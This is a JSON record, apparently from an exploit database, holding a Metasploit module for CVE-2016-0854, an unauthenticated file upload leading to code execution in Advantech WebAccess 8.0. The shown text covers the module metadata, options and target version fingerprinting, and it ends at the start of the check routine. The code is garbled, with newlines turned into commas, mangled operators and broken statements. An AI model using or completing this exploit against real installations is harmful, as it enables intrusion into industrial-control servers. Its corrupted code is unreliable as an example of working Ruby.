{
    "text": "vul_name : Advantech WebAccess Dashboard Viewer Arbitrary File Upload ， vul_cve : CVE-2016-0854 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， super ( update_info ( info ,  ， 'Name' => \"Advantech WebAccess Dashboard Viewer Arbitrary File Upload\" ,  ， 'Description' => %q{ ， This module exploits an arbitrary file upload vulnerability found in Advantech WebAccess 8.0. ， This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations ， of Advantech WebAccess. Authentication is not required to exploit this vulnerability. ， The specific flaw exists within the WebAccess Dashboard Viewer. Insufficient validation within ， the uploadImageCommon function in the UploadAjaxAction script allows unauthenticated callers to ， upload arbitrary code ( instead of an image ) to the server , which will then be executed under the ， high-privilege context of the IIS AppPool. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'rgod' ,  # Vulnerability discovery ， 'Zhou Yu <504137480 [ at ] qq.com>' # MSF module ，  ]  ,  ， ' ，  [ 'CVE' , '2016-0854' ]  ,  ，  [ 'ZDI' , '16-128' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Platform' => 'win' ,  ， 'Targets' => [  ，  [ 'Advantech WebAccess 8.0' , {} ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Feb 5 2016\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， Opt : RPORT ( 80 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path of Advantech WebAccess 8.0' , '/' ]  )  ，  ]  , self.class )  ， end ，  # Software Build : 8.0-2015.08.15 ， fingerprint = data.match ( /SoftwaresBuilds : s ( ?<version>d{1 , 2}.d{1 , 2} ) - ( ?<year>d{4} ) . ( ?<month>d{1 , 2} ) . ( ?<day>d{1 , 2} ) / )  ， fingerprint [ 'version' ] unless fingerprint.nil? ， end ， def vuln_version? ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => target_uri.to_s ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( res.redirection )  ， end ， ver = res res.body ? version_match ( res.body )  : nil ， true ? Gem : Version.new ( ver ) = Gem : Version.new ( '8.0' )  : false ， end ， def check",
    "time": "2016.04.27"
}